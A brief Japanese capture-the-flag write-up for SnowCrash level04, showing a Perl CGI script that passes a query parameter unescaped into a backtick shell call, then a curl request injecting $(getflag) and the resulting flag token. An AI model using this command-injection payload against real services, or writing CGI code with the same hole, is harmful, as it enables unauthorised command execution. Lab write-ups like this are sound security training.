```sh
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

`localhost:4747`へリクエストを送れる。
`x(param("x"));`クエリパラメーターの`x`を`echo`してる。
これを利用して、`$(getflag)`変数展開する。

```sh
level04@SnowCrash:~$ curl 'http://localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```